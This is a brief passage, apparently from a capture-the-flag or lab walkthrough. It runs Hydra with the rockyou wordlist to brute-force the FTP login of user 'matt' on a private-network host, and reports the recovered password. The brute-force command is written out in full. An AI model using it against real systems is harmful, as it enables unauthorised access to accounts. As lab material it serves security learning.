3.3 Hydra



We have enumerated two usernames let’s go for brute force attack with the help of “hydra” and try to find its password for login into FTP.

$ hydra -l matt -P /usr/share/wordlists/rockyou.txt 192.168.12.32 ftp -e nsr


Output:


We've found one of them.

Username: “matt”
Password: “cheese”
